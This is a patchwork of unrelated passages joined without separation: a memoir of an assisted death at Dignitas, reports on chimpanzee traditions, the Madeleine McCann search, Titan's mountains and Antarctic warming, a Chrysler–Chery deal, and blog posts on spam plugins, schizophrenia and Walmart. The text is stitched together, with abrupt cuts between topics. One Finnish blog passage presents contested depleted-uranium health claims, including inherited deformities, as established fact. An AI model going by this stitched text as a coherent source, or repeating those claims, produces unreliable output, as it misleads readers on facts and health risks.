And all these people were just doing their own thing .
The food at the hotel was good , the wine was good , and in our room there was a bath with a wide tiled section at one end .
We both looked at it and had the same thought .
" You could sit on that , " I said .
So I helped her on to it , and pulled the curtain , and she actually had a shower at the end , which absolutely delighted her .
Because that was one thing she had craved and could n't have - a lie - down and a soak in the bath .
The next day we had our appointment at the Dignitas flat .
Elizabeth had kept a special skirt and blouse , and I dressed up a bit ; I 'd brought a special shirt and jacket and trousers , but it was too hot to wear the jacket , so I just wore the shirt , which she made a joke about .
We went by taxi , and were met immediately by a man who welcomed us warmly , and helped us feel a bit more at ease .
The flat is tiny , with just one room , with a kitchenette .
There 's a bed with a thick mattress and cushions .
Also a round table , chairs , a carpet , and three nice paintings on the wall , which Elizabeth commented on .
There was a little dish of chocolates , which they kept offering us ; Elizabeth had to eat them so she could keep down what she had to drink .
We did the admin first .
Elizabeth signed away power of attorney , and signed a document which exonerated Dignitas of anything that could possibly be held against them if the procedure failed in any way .
We were given some water and though we all had a drink , the real reason was to check that Elizabeth could swallow the necessary volume of liquid .
It was explained that she would have to take an anti-emetic half an hour before she took the drug , and repeated , several times , that she could change her mind at any time , up to the point where she took the final glass .
She drank the anti-emetic , and we sat there chatting .
Then the officiating member of Dignitas asked our son and me to leave the room for a few minutes .
Again this was to make sure that Elizabeth 's decision was her own , taken in full control of her senses .
He asked if we wanted him to go out of the room .
Well , I could n't have said anything , so he stayed .
We just talked .
He explained that he would take a video of her drinking the drug as additional proof that she had taken it herself .
It would be a 20 - second video that nobody would see except himself and the police , and then it would be destroyed .
In fact , he conducted the whole procedure with the greatest gentleness and kindness and managed to make Elizabeth feel relaxed and at ease , which amazed me .
Finally he said to her , " Are you ready ? "
He asked her if she would like to move to the bed , and she said yes .
So our son helped her - he was doing the physical job , and , I feel now , was maybe more caring in what he said to his mother at the end than I was .
Then he sat with her .
I could n't .
They adjusted the bed ; she wanted it a bit more upright .
He said , " If you drink this , you will die . "
It was her final chance to change her mind .
And she said , " That 's all right .
I 'll take it . "
It 's very bitter stuff , apparently , but she started to drink it quite successfully .
Then we perhaps made a mistake , when he took the video , of giving her a straw .
She did n't vomit , but she began to cough .
Some had gone down the wrong way .
And I thought , " Oh , God , " and I went over and held her hand , and said , " Do n't for God 's sake be sick , Elizabeth . "
I think she had taken perhaps three - quarters of it , and we were frightened that she would n't drink enough to kill herself before she passed out .
But eventually she began to black out , and it stopped her coughing .
She had drunk about nine - tenths of it .
And within perhaps 50 seconds of first drinking it she had gone to sleep .
And that was it .
He waited about half an hour after she had drunk it to make sure that she was dead .
Then he went to the phone and a policeman promptly arrived , a detective sergeant .
He examined all the documents , but I was n't there .
I could n't stay in the room .
And I could never have answered all their stupid questions , but our son stayed .
He was very composed .
After a while he came out and we went and stood outside on the landing , just staring blankly out of the window .
Then this bevy of people arrived .
There must have been half a dozen of them .
I know one was a doctor , there to make sure that she was dead , and to establish the manner of her dying , but who the hell the rest of them were , I 'm not sure .
They may well have been police , because it 's regarded as a potential crime scene .
The funny thing is , if Elizabeth had known what would happen in the hour after she died , she might well not have gone ahead with it , because I 'm sure she was examined very thoroughly .
It was n't the kind of treatment she might have wished .
But there we are .
It 's done now .
Our daughter had suggested we book a return flight to Zurich , in case questions were asked as we were leaving England and the police got involved .
When we arrived at Zurich airport with a wheelchair and no passenger , some eyebrows were raised , but everyone must have known what had happened .
In all the confusion at security I left a cushion behind , but everything else got through without trouble .
Our son went back to his home , and our daughter met me at mine , then phoned people up to tell them that Elizabeth was gone .
I could n't speak .
I do n't regret what we did , but I am very angry about the way it had to be done .
It seems crazy to me that you must either risk jail or go to Switzerland to do something you should be able to do provided you do it yourself and nobody else is involved .
It seems wrong that while suicide is no longer an offence , finding a way to achieve it is .
Surely it is a right , like any other human right , to dispose of your life as you see fit ?
I observed with interest the halting progress of Lord Joffe 's assisted dying bill through the House of Lords .
I have to say that none of the arguments made against it persuade me .
Some people are worried about the possibility of abuse , but I can't believe that it is beyond the wit of good legislators to provide a framework like the one Dignitas operates within : it must be established that the patient is of sound mind , is making the decision without outside pressure , and is responding to an illness that they believe will certainly lead to a quality of life they will find intolerable .
There is also , of course , the argument of the influence that might be brought to bear on doctors , and I know that the British Medical Association recently voted to oppose the legalisation of euthanasia , overturning its previous policy of neutrality .
But I do not see a problem if the decision is allowed to rest with the doctor .
One of Elizabeth 's asked me if we had had our flu injections .
We had , so she suggested we should n't next year : if Elizabeth caught pneumonia , she would make sure she did n't suffer .
Another doctor apologised to Elizabeth that he could n't help in the way Elizabeth wished .
Of course they can't take risks that would jeopardise their careers .
But even if the law changed , they should n't have to do it if they did n't want to .
As for religious objections about the sanctity of life , I respect that point of view , but it does n't mean it has to apply to the rest of us .
I know I 'm not in a minority : a recent poll , by YouGov for the Dignity in Dying group , found that 76 % of people were in favour of assisted dying provided there were safeguards in place .
I have decided to tell this story because I do n't want anybody to go through what we did , especially that first attempt at home .
I 'm also hoping to add a bit of pressure , to help to change the law .
Dignitas is not cheap .
It probably cost me about £ 5,000 , with all the administration , the flights and hotels and cremation , and while I could afford it , not everyone is able to .
More importantly , because the person who wants to die has to be well enough to travel , you end up having to go earlier than you 'd like .
That was the thing that Elizabeth knew , that I refused to see , because I did n't want to rush - that if we had n't gone when we did it would have been too late .

Given how long we have to live with a company or brand name , it ’s amazing how little thought most businesses give to them .
Most look at a name as a personal choice rather than a brand or marketing strategy , or strictly as a legal necessity .
Asking Price : Make an Offer
Scientists have long wondered if local animal cultures exist , and now , based on findings by researchers at the Yerkes National Primate Research Center at Emory University , the University of Texas and St. Andrews University , Scotland , they have their answer : Yes .
The study , available in today ’s online edition of Current Biology , confirms captive chimpanzees have the capacity to sustain the same kind of multiple - tradition cultures many researchers believe exist in the wild , providing further evidence chimpanzees and humans shared a common ancestor five to six million years ago who had a similar level of cultural complexity .
For years , primatologists have suggested different communities of chimpanzees across Africa vary in many behavior patterns , indicating they have cultures specific to each community .
In the wild , however , it is difficult to prove behaviors are passed on by observation and learning .
In this study , members of the international collaborative research team taught forms of tool use and food extraction techniques to high - ranking individuals in four different captive chimpanzee communities .
Researchers then observed as those individuals passed on the techniques to other members of their communities .
The researchers included Frans de Waal , PhD , Victoria Horner , PhD , and Kristin Bonnie from the Yerkes Research Center , lead researchers Andrew Whiten , PhD , and Antoine Spireti from St. Andrews University , and Susan Lambeth , PhD , and Steven Schapiro , PhD , from the University of Texas .
In the Yerkes - based portion of the study , Dr. de Waal , Dr. Horner and Dr. Bonnie worked with two chimpanzee groups and introduced each to one of two alternative sequences of complex behaviors .
The sequences included collecting , transporting and depositing a token into a bucket or a pipe to receive a food reward from a separate , unrelated location .
After each group of chimpanzees observed a high - ranking female member of its own group complete an action sequence , the majority of the chimpanzees followed that sequence for the remainder of the testing period .
Over time , the different methods chosen by each high - ranking female were passed among members of her group , thereby becoming a local tradition .
In all , the researchers observed 10 traditions spread throughout the chimpanzee groups at the Yerkes Research Center and the University of Texas .
“ This study nicely summarizes our collaborative work of the last five years , showing we can artificially introduce cultures in chimpanzees , which supports the idea cultural variation observed in the wild is learned , ” says Dr. de Waal .
“ We are the first to show cultures potentially can jump from group to group if you offer chimpanzees the opportunity to watch other groups .
It ’s a bit like Westerners learning to eat with chopsticks . "

Police hunting for Madeleine McCann launched a 2 am raid on the South London home of an innocent woman in her 70s .
Officers acting on behalf of Portuguese police have targeted at least two properties in South London with similar addresses - both have the same house number and road name and are less than five miles apart .
News of the searches came after Portugal 's Policia Judiciaria said they were following leads from psychics and clairvoyants .
It is understood they are clutching to the hope that Madeleine 's abductor might pose as someone with psychic powers so that he could free her , tell police of a vision identifying where she could be found - and avoid detection .
There was no sign at either address of Madeleine , who was taken from the holiday apartment of her parents Gerry and Kate in the Algarve on May 3 .
British police would not confirm if some of these leads were being passed on and it is not known if the London searches were due to such a tip .
Within the space of 12 hours , officers raided a Thirties former council house in Merton Road , Wandsworth , and a home in Merton Road , South Norwood , last Wednesday .

Police declined to comment but the fact that they checked near - identical addresses suggests they had been given precise information .
The elderly woman , who declined to give her name , said : " Two policemen banged on my door at about 2 am .
I was n't too happy about it but they said they were here because of the missing girl .
They were here for about 15 minutes . "
Also searched was the home of Debbie Seepersad , 40 , who lives with her 12 - year - old daughter Maressa .
" I really thought it was a wind - up and I 'm still in shock , ' she said .
A Leicestershire Police spokesman said : " Our role is to co-ordinate UK - based inquiries at the request of the Portuguese authorities .
We have worked with forces across the country to undertake a number of inquiries on behalf of the Portuguese . "
Belgian police are investigating a reported sighting of Madeleine in Liege .
Chief Inspector Olegario Sousa , the Portuguese officer in charge of the hunt , said : " We just follow the information passed to us .
If there 's enough detail to allow us to follow it , for example if there 's a name or a location , then we will follow it up . "
Mr and Mrs McCann have spoken of their hope that the four - year - old is in the hands of someone ' sad ' rather than ' bad ' .
SHANKSVILLE , Pa. , Sept. 7 — Valencia M. McClatchey thought she was doing the right thing when she gave the F.B.I. a copy of her photo of the mushroom cloud that rose over the hill outside her home after United Flight 93 crashed in a field here on Sept. 11 , 2001 .
And , after it became apparent that hers was the only known picture of that ominous , gray cloud — and the first shot after Flight 93 crashed — she thought she was still doing the right thing when she gave copies to people who asked for them , and let newspapers and television stations use it .
But fame for the photo has had an unexpected cost for the photographer .
“ Every time I ’ve done any stories it goes online and all these conspiracy theorists start up and they call me and harass me , ” said Mrs. McClatchey , 51 , who runs her own real estate company .
In numerous online postings , critics have ripped apart every element of the photo , and Mrs. McClatchey ’s life .
They accuse her of faking the photo , of profiteering from it and of being part of a conspiracy to cover up the fact that Flight 93 was shot down by the government .
Government agency says Bush overreaches on executive privilege Michael Roston
Published : Friday July 20 , 2007 Print This Email
This A report earlier this month by the Congressional Research Service , a nonpartisan agency that studies policy and legal questions for Members of Congress , found that President George W. Bush 's recent assertions of ' executive privilege ' to fend off Congressional investigators were dubious .
Morton Rosenberg , a Specialist in American Public Law at CRS , said that the assertion of privilege recently attempted by the White House went beyond restraints found in recent legal decisions .
" [ R]ecent appellate court rulings cast considerable doubt on the broad claims of privilege posited by [ the Justice Department 's Office of Legal Counsel ] in the past and now by the Clement Memo , " Rosenberg wrote in the July 5 report .
' The Clement memo ' refers to a document published by the White House and written by Paul Clement , the Solicitor General at the Justice Department , who must serve as ' acting Attorney General ' for all matters dealing with the US Attorneys controversy .
Rosenberg wrote that a pair of Clinton - era federal court rulings , the so - called Espy and Judicial Watch cases , " arguably have effected important qualifications and restraints on the nature , scope and reach of the presidential communications privilege . "
For instance , he wrote that " the unavailability of the information elsewhere by an appropriate investigating authority " could overcome an assertion of executive privilege .
In related news , the Washington Post 's Dan Eggen and Amy Goldstein provided details of a White House legal strategy that would expand the scope of executive privilege .
They write that the Justice Department will effectively order the US Attorney for the District of Columbia to decline to file any criminal contempt charges against current and former White House officials who refuse to comply with subpoenas based on an assertion of executive privilege .
The CRS report , which like all of the agency 's publications has not been made publicly available , can be downloaded from the Federation of American Scientists ' Project on Government Secrecy .
The tallest mountains ever seen on Titan -- coated with layers of organic material and blanketed by clouds -- have been imaged on Saturn 's moon Titan by the infrared camera on NASA 's Cassini spacecraft .

The infrared - sensitive camera on NASA 's Cassini spacecraft has photographed the tallest mountains ever seen on Saturn 's moon , Titan .
The mountain chain is nearly a mile high ( 1.5 kilometers ) , 93 miles long ( 150 kilometers ) and 19 miles wide ( 30 kilometers ) .
The mountains are topped by bright , white material which may be methane or other organic ( carbon - containing ) " snow . "
" We see a massive mountain range that reminds me of the Sierra Nevada in the western United States , " said Cassini scientist Robert H. Brown of the University of Arizona Lunar and Planetary Laboratory in Tucson .
Brown is head of Cassini 's visual and infrared mapping spectrometer ( VIMS ) , which imaged the mountains in Titan 's southern hemisphere during the Oct. 25 , 2006 flyby .
The camera took its highest - resolution infrared views of Titan ever during this flyby , resolving surface features as small as 400 meters , or about 440 yards .
Other features seen in the high - resolution VIMS images include fields of dunes and a deposit that resembles a volcanic flow .
If Titan were Earth , the mountains would be at latitudes near New Zealand .
They probably formed as mid-ocean ridges form on Earth :
The surface crust pulls apart , and material beneath the crust wells up through the crack , creating a ridge .
" These mountains are probably as hard as rock , made of icy materials , and are coated with different layers of organics , " said Larry Soderblom of the U.S. Geological Survey , Flagstaff , Ariz . , a Cassini interdisciplinary scientist .
" There seem to be layers and layers of various coats of organic ' paint ' on top of each other on these mountain tops , almost like a painter laying the background on a canvas , " Soderblom said .
" Some of this organic gunk falls out of the atmosphere as rain , dust or smog onto the valley floors and mountain tops , which are coated with dark spots that appear to be brushed , washed , scoured and moved around the surface . "
Cassini scientists combined the new infrared data with radar data from previous flybys to better understand the height and composition of Titan 's geologic features .
The shadows of the mountains are seen in the infrared images , for example , while the shapes of the mountains are seen in radar .
Combining these different kinds of data is essential for scientists studying Titan 's geologic processes .
The Oct. 25 infrared images also reveal a fan - shaped feature , which Brown said is probably a remnant of a volcanic flow .
Cassini radar imaged this fan - shaped feature , and also a large , circular feature that appears to be the source of the flow , in less detail on a previous flyby .
" The evidence is mounting that this circular feature is a volcano , " said Rosaly Lopes , radar team member at NASA 's Jet Propulsion Laboratory in Pasadena , Calif .
" With radar data alone , we identified it as a possible volcano , but the combination of radar and infrared makes it much clearer . "
Clouds lie near the wrinkled , mountainous terrain in Titan 's southern mid-latitudes .
Their source has baffled scientists .
" These clouds are probably methane droplets and may form when the air on Titan cools as it is pushed over the mountains by the Titanian winds , " Brown said .
The new infrared images also clarify the composition of dunes that run across much of Titan .
The dunes , built on water - ice bedrock , seem to consist of sand grains made of organics , Brown said .

Over the last two months or so there has been a surge of comment spam on this very blog .
It has come to the point where I have been erasing 200 email notifications for comments on GeoLand ; all of them for Viagra and other exotic drugs .
The time has come to step up and do something about it .
I wanted a solution that is easy to install and does the job right .
Reading a few blog posts on other wordpress blogs that have had similar problems I decided to give Math Comment Spam a go .
At a 4Kb download and 2 minute install instructions its not bad of a solution .
I just dropped the two php files of the zip file in a subfolder of my plugins directory ( / wp- content / plugins / ) , enabled it , and dropped a small piece of code in my comments .
php file and I was ready to go .
Now spammers have to physically take a look at the form and solve a very elaborate math problem which might discourage them a bit , since now the whole process stops being automated ( using automated spam bots ) .
While on the subject I have to note that while looking personally at all these comment notifications I might have missed a few good posts .
If you do n't see a legitimate post of yours left whithin the last two months , I apologize ; please post again .
UPDATE ( sep 16th ) : the math comment plugin does really work !!!
I have actually received only one spam message in a period of more than a week , while in the past I had to go through hundreds of spam messages daily to see if there was any legit among them .

Data from nine research stations were used in the study
Research published in the US journal Science says the warming is seen across the whole of the continent and much of the Southern Ocean .
The study questions the reliability of current climate models that fail to simulate the temperature rise .
In addition , the scientists from the British Antarctic Survey ( BAS ) say the cause of the warming is not clear .
It could be linked to increases in greenhouse gases in the atmosphere or natural variations in Antarctica 's climate system .
Scientists are keen to understand the change in temperatures over the continent as the region holds enough water in its ice to raise sea levels by 57 metres .
Temperature rise
Temperature rises on parts of the surface of Antarctica have been seen for some time .
The western side of the Antarctic Peninsula is known to have the largest annual warming seen anywhere in the world with increases of over 2.5C in the last 50 years .
Until now , very little was known about air temperatures above the vast continent .
The new work uses meteorological data collected from weather balloons launched in the Antarctic winters between 1971 and 2003 .
The scientists collected information from nine international research stations , mostly in the east of the continent .
It 's the largest regional warming on Earth at this level
Dr John Turner
Their analysis shows that temperatures in the layer have risen by between 0.5 and 0.75C for each of the last three decades .
" It 's the largest regional warming on Earth at this level , " said Dr John Turner of BAS , one of the authors of the paper .
However a question remains over what is causing the change .
" There are arguments for and against this temperature rise being caused by greenhouse gases , " Dr Turner told the BBC News website .
" The problem is trying to differentiate between what is happening naturally and what is happening because of man 's activities " .
Climate models
To try to resolve the conundrum , the BAS team compared the data with 20 simulations of the climate over the last century .
The models simulate rising levels of greenhouse gases and are used by the Intergovernmental Panel on Climate Change ( IPCC ) to replicate past climates and make predictions for the future .
The team found that in all cases , the models failed to simulate the rise .
The models do not match the data
Dr Jeff Ridley , a climate scientist at the Hadley Centre for Climate Prediction and Research in the UK , agrees .
He believes it is likely that current climate models are unable to sufficiently recreate conditions on the continent .
" I 've looked at all these models and seen that Antarctica is not very well modelled at all , " he said .
" So we should n't put too much confidence in what they tell us is going to happen there . "
For example , observations show that in Antarctica winds flow from the South Pole out to the coast in winter .
As they move they lose energy , causing heating and mixing the air above .
But in the climate models , simulating these air flows and the mixing is too complex .
Instead the model is simplified with a cold layer at the surface that does not mix with the rest of the atmosphere .
One reason for this is the scant data that has been collected across the continent .
Another is that the climate models are still not very good at simulating relatively small - scale regional processes .
Dr Ridley is trying to work out how to overcome problems like this in climate models , and believes the new data will help understanding of processes in Antarctica .
But he says we should not lose faith in the ability of current models to predict worldwide climate change .
" On a global scale , the processes we have in the models work well .
We are confident we are able to predict the past , and globally we can predict climate change . "

On DU and Finnish troops abroad
Last month we reported that Finland has suffered its first UN casualty caused by depleted uranium ( DU ) .
After some extra investigations we were able to deliver the " good news " ( if you can use such an expression in this context ) , namely that the Finnish officer in question has received and is getting " best possible treatment " .
In the last - mentioned wire we suggested that any Finnish UN soldier , and � somewhat generalizing � any Finn altogether suspecting of being possibly contaminated by the U.S. - Israeli use of depleted uranium should contact the the Finnish UN troops magazine " Sinibaretti " so to ask their advice how to find their way to the medical treatment facility pathfinded by the Finnish UN officer mentioned above ( he having been intelligent enough to locate the treatment in the first place ) .
So , if you are a Finn having had a contact with U.S. - Israeli DU bombardment zone ( such as Iraq , Afghanistan , and � possibly � Lebanon ) , do not hesitate to contact Sinibaretti ( follow the link in the article above ) : should they hear you �re in a sort of trouble described here , we�re quite convinced that after checking your story ( and its trustworthiness ) the guys there will fetch their good old jungle drums ASAP and pass out the message quite confidentally and with no names mentioned .
After that we expect somebody � hearing of the familiar jungle mail of the Finnish UN reporters will in his turn air out a reply revealing the location of the first aid tent to them to the effect that you�ll reach it too ( all this with absolutely no names mentioned , especially those yours and the UN officer in question , of course ) .
On NDHF position : reply to Gary 's comments
Some time later a reader ( calling himself Gary ) commented our article asking " Is this a big secret ?
Why all the veiled hush hush ? " to which we'd like to answer here :
While we apologize this ' stealth mode� approach to the issue , we trust you understand our position after these explanations :
1 . We �re adamant in never ever in this world ( or any other ) letting the name ( or any details ) of the Finnish UN soldier in question to anybody , not in our reporting , not in phone , not in conversation , nor email .
There is a thing called " kunniasana " ( in English " the word of honour " ) which is one of the most sacred things to the Finnish and we�ll jolly well stick to that till we kick the bucket .
2 . Our reporters and editors are well aware that there is all sorts of stuff posted in the internet ( some of it spread by loonies , liars or those only capable of taking care of their own ass ) so we had to report the issue in such a manner that
( a ) no Finnish wounded is left ( " haavoittuneita ei j�tet� " )
( b ) the readers will be able to determine whether the medical treatment we suggest is credible or not
( c ) our crew � nor any other involved � doesn�t need to pass any names ( this is not some fucking " human interest " story )
( d ) the Finns anywhere in the world will get the info and thus will be able to reach the medical treatment currently available .
3 . To reach these goals we muscled the gray stuff until we reached the results you �re now aware of : by googling the supposed key words of the DU problem ( such as Finland , depleted uranium , UN etc. ) you�ll easily confirm that � thank you Uruknet ;) � you�ll find our wires topping the search ( though someone has installed a filter to our uruknet version so that it wo n't appear in Google , we got some help e.g. here so that the Finns will get the news of the treatment despite the hostile implanteurs of the filter .
4 . Applying this method we haven�t mentioned any names � and neither will Sinibaretti � ( point c ) , the reality of the treatment channel is secured by Sinibaretti ( point b ) and � what the most important � due to Uruknet�s google coverage any Finn in anywhere in the world ( point d ) will reach the medical treatment following the instructions we just gave ( point a ) .
5 . In short , we�re just errand boys with no authorization whatsoever to provide any more information on the issue , and absolutely intending to stay so .
Now that the most basic requirement of any military enterprise ( such as that of Finnish NATO - read : U.S. terror war - membership plotted by the Finnish MoFA here ) , a medical treatment facility for the casualties has been secured ( however preliminary , unofficial and unspecified that might be ) , let us go down to the business .
DU and Babies , Children
The unfortunate truth is that the first Finnish DU casualty is just a part of the problem , which is best illuminated by the following photos taken of Iraqi children ( mostly from the southern part of Iraq , hit by U.S. DU at the same time our Finnish UN casualty ) .
Though we�ve noticed that most people simply refuse to have a close ( or any ) look of the pictures , often suggesting something like " couldn�t we discuss on something else " , we strongly urge the Finns - and all the others as well - not to do that , but take your time with each picture for the reasons to be explained right after the photos of Iraqi and Afghan babies :
Basically , now you know the same as we do so that we can have a little chat :
What comes to the effects of the DU there are many sorts of opinions ranging all the way from Pentagon�s complete denial to those with the opinion that the U.S. has already released enough DU to wipe off the entire mankind and the most of other organic stuff besides ) .
Not scientifically qualified nuclear + medical physicists ourselves we�re unfortunately unable to provide you an accurate statement on how harmful DU exactly is .
Instead , we can tell you something more : never ever in the history of the mankind ( except perhaps after Hiroshima and Nagasaki ) there have been documents as horrible and as devastating than the photos reproduced above .
There is no ' paradigm � or model according to which the photos above could have been forged , resulting in the simple understanding that no matter how pro or against ( or beyond ) the harmfulness of DU we might be , the truth is that the DU is exactly as harmful as directly shown by the harm done by it to the children in the pictures .
DU and women
What all the women in the world should know is that once your husband ( or you , should that be the situation in your home ) have been contaminated by DU this causes DNA changes which may ultimately result in your offspring being deformed not unlike the babies in the pictures above .
To ensure you that this is actually so , here is a couple of pictures of American DU positive GIs with childreb having inherited the DU - mutated DNA of the father :
With this we do not want to say that having handicapped children would be a ' bad� thing as such : on the contrary it is well known in all the cultures able to support and raise handicapped children that the parents tell that what happened was actually a gift in the sense that the experience opened a new world of accepting , understanding and learning things that would have never fitted to their view of the world .
However , many DU positive ex-soldiers ( and their spouses ) do make the decision of not getting children , which � in our opinion � is equally understandable .
Should there be a verified DU positivity ( which is easy to determine by the presence of the isotope U - 236 not appearing naturally ) it must be one of the most difficult decisions ever to be faced by parents .
DU in Iraq , Afghanistan
The ultimate concern of our staff is not so much the U.S. ( or through UN and NATO and alike ) and the western troops , but rather the people in the Middle - East in general : in the following picture is the immediate target area of depleted uranium in the U.S. wars in Afghanistan , Iraq :
For those thinking that DU has used only limitedly , we recommend you to think again : some years ago the U.S. Navy visited Finland and one of our informants had a chat with the U.S. sailors , who boasted that every single gun in the ship was loaded with DU rounds , which actually come in all sizes and calibres as shown by the items in the following picture :
In other words , where 's the U.S. there 's DU .
So should Mr Kanerva ( and the Kokoomus party U.S. war industry stockowners ) actually succeed in taking Finland to NATO ( a.k.a. Afghanistan war ) it is the Finnish people , men , women and their children who'll pay the price , the price being as shown by the pictures above .
Post Scriptum
We would like to thank Gary questioning our news delivery .
Reading his points we have tried to explain our position in the DU issue as clearly as we could .
To this we�ve nothing more to add except that in order to follow the Finnish line of thought ( or " culture " ) non-Finns may find the following general observations of our people helpful :
1 . As stated in our first wire , we�re not only protecting our sources , but also the Finnish military , which is one of the most decent , if not outright the most decent in the world .
Based on our experiences on both the Finnish outfit is almost the exact opposite of the U.S. Expeditionary Force in all the respect : what may strike an outsider as a secrecy is nothing else but that in Finland you just do not go around holocausting , murdering , invalidizing , refugeeing , raping , bribing people � and walk out of the phony militaty court with your crimes pooh - poohed away .
2 . On the contrary , in the Finnish Army a commander - in - chief in any theatre of operations ultimately has the responsibility of EVERYTHING , even of incidents obviously not his / her fault .
One issue belonging to this category happens to be the idiotic strategy of U.S. idiots in Washington to nuke everyone , for which our officers would have to take blame should any details leak .
So our crew cannot pass any details in any circumstances whatsoever , and rather do our time in the local cage , slam , big house , if offered an invitation you cannot turn down .
3 . Should anybody suspect that the Finnish outfit really is as nice as we claim , we�d like to point out the following story : nowadays " Afghanistan " ( with 100 Finnish UN troops there ) , and especially all the administration is synonymous with corruption .
What comes to bribery , it is particularily disliked by the Finns to the effect that our country has been topping the least corrupted country in the world five years straight .
The absurd depth of Afghan corruption is neatly illuminated by the fact it is just the non-corrupted Finns that are taking up charges against other Finns involved in corruption on regular basis , just recently here .
4 . To our knowledge , nobody�s offered a satisfying explanation to the phenomena , but one of the idiosyncrasies of our people is that Finns does not leave their casualties , not wounded nor dead .
The highest manifestation of this primal ( or " hypotalamic " ) instinct is visible in the actions of the Finnish WWII veterans , who to the recent days , well over 60 years after the war still visit the combat zones ( now in the Russian soil ) in order to recover the bodies of their brothers - in - arms and bury them properly here in Finland .
This is why the Finns have already found preliminary DU medical treatment and this is why our crew has chosen to come out with the information so to secure a channel to medical treatment .
Tom LaSorda ( L ) , Chrysler Group President and CEO , shakes hands with Yin Tongyao ( R ) , Chery Automobile Chairman and President at the signing of a cooperative agreement in Beijing July 4 , 2007 .
[ Reuters ]
Independent Chinese carmaker Chery Automobile
Co clinched a landmark deal in Beijing with US - based Chrysler Group yesterday to make small cars for the North American and European markets .
The first model in the partnership will be a Dodge based on Chery 's 1.3 - liter A1 hatchback , said top executives of the two sides .
The car , to be assembled at Chery 's home base in eastern city of Wuhu , will be first shipped to Mexico before January , Chery sources said .
However , no timetable has been revealed for the launch of Chery - made Chrysler cars in the US and Europe , where other Chinese carmakers have faced quality problems recently .
Chrysler CEO
Tom LaSorda said he has " no concerns " about Chery - made vehicles and both companies would develop new globally competitive products based on future Chery small - car platforms .
The tie - up with Chery will have a " nearly immediate effect " on Chrysler 's offerings in the small - car segment , LaSorda said .
" This strategic partnership is part of a new business model that allows us to introduce new products more quickly , with less capital spending , " he said .
Yale Zhang , director of Greater China vehicle forecasts for consultancy CSM Worldwide ( Shanghai ) Ltd , said Chrysler will be able to take advantage of Chery 's low costs in China .
" It could be unprofitable for Chrysler to develop small cars on its own , " Zhang said .
For Chery , which is growing sales at home and abroad aggressively , the collaboration will help it improve quality and design to pave the way for its own brand 's forays into the US and European markets , he said .
The company said earlier that it aimed to boost sales to 400,000 cars this year from 305,000 units in 2006 .
It expects to double exports to 100,000 units .
Chrysler , which is being sold to Cerberus Capital Management by DaimlerChrysler in a $ 7.4 - billion deal expected to close as early as this month , now produces the 300C large sedan in a plant in Beijing .
It plans to bring a Sebring mid-sized sedan into the Beijing plant and a Dodge Caravan minivan into another factory in the eastern city of Fuzhou later this year to further explore the Chinese vehicle market , the world 's No 2 after the US .
Sales of China - made vehicles totaled 3.65 million units in the first five months of this year , up 22 percent from a year ago , according to industry data .
A few years ago NPR did a story called “ The Sights and Sounds of Schizophrenia ” which tells about a training program created by Janssen Pharmaceutica , a pharmaceutical company that specializes in treatment for Schizophrenia .
I watched the 5 minute video just one time 5 years ago and it literally changed me .
It was such a powerful and moving experience that I cannot forget it and it altered my perception of mental illness forever .
I ’ve tried to tell people about it over the years , but it ’s just something you have to see , so finally I searched and searched until I found it again so I could put it on the blog .
The textbook description of schizophrenia is a listing of symptoms : delusions , hallucinations , disorganized speech and behavior .
But what does schizophrenia really feel like ?
NPR ’s Joanne Silberner reports on a virtual reality experience that simulates common symptoms of the mental illness .
Silberner , who experienced the simulation , says it works this way : “ For five to 10 minutes , someone wanting to know what it feels like to have untreated schizophrenia puts on goggles and headphones , and sees and hears a range of hallucinations .
You can choose your virtual reality — what happens on a trip to the doctor ’s office , or on a ride on a city bus . ”
In the program she experienced , a caseworker takes the schizophrenia patient to a grocery store with a pharmacy in the back , to refill a prescription .
To create the virtual reality project , technical director Stephen Streibig consulted a group of people with schizophrenia , including Daniel Frey , 26 .
Frey describes what he and Silberner experienced in the program : “ When you first walk into the pharmacy , you ’re walking through the aisles and there are people staring at you , just staring at you from every aisle .
And there ’s one instance where there is a woman sort of protecting her children from you when you walk through the aisle . ”
Even though schizophrenia patient
Frey consulted on the project , he found the simulation too disturbing to sit all the way through .
When Silberner tells him she was terrified by the experience , Frey responds , “ Yeah , you ought to be !
Imagine not being able to take off the goggles , the helmet . ”
I also found this other video that is even better , in a creepy sort of way :
If you found this as informative as I did please help spread the word .
I think the more people that see this , the greater the tolerance we ’ll have for those less fortunate than ourselves .

In these papers he demonstrates that these specialized engines can run orders of magnitude faster than the commercial databases , using commodity hardware .
I am not sure all the comparisons are fair , but he makes a compelling case .
Of course Mike is a principal in Vertica which directly competes with what he calls “ The Elephants ” .
Given that I have been close in the past to another example about how commercial goals can cloud academic judgment , am I rather cautious in evaluating these papers .
This week at VLDB Mike gave an invited talk on this topic in the Industrial Research track .
His talk centered on that while he had previously proven that specialized approaches could run circles around the Elephants , he now could also demonstrate that OLTP , which is the bread - and - butter of the database industry , could be greatly outperformed by new architectures .
In the paper and in his talk he put out a challenge to the research community , and to graduate students in particular , to take a particular interesting application area and build specialized solutions that provide at least a 50X improvement over the current products .
I like this challenge , given that 50X is likely to be able to make impact , where 2 - 4X in general can be easily compensated for by the next generation hardware .
But something bugs me about the challenge and also about some of the demonstrations in the papers ; 50X is still focused on scaling - up , just as many of the current database systems do , instead of scaling out , which is what the world really needs .
The evidence in the paper is indeed about single box performance .
This continuing N=1 thinking will never yield systems that can break through the current scalability limitations of enterprise software , regardless whether it runs 50 times faster or not .
If I could rewrite the challenge I would go for asking for “ demonstrating performance at scale ” ;
That one can achieve the rock solid performance and reliability guarantees by just incrementally increasing the components in the system , without any limitations .
And every scaling axis needs to be satisfied ; request rates , request complexity , data sets size , etc .
Only focusing on 50X just gives you faster Elephants , not the revolutionary new breeds of animals that can serve us better .

Walmart misses , cuts outlook
Economic pressure around the world blamed for poor showing
Reuters : August 14 , 2007 -- Wal - Mart Stores Inc. reported a lower - than - expected quarterly profit and cut its full - year earnings forecast on Tuesday , saying its customers remain under economic pressure ...
" It is no secret that many customers are running out of money toward the end of the month , " Scott said on a recorded conference call .
( Full )
What ?
The great American working class , running out of money ?
How can that be ?
Well to begin with they are n't the " American " working class any more .
They 've become the WalMart working class .
Yes , WalMart is a nation .
To be precise it 's the world 's 4th largest economy .
Over the last decade or so WalMart has had more impact on the lives of America 's working classes - from the working poor to skilled blue collar workers - than Uncle Sam .
The WalMart nation is comprised of roughly 127 million former American workers .
With more than 127 million customers visiting a U.S. Wal - Mart store or a Sam's Club warehouse location in America every week , the company is considered a barometer of the health of the nation 's retail sector .
The deal , according to free - trade , free - market conservatives , went like this :
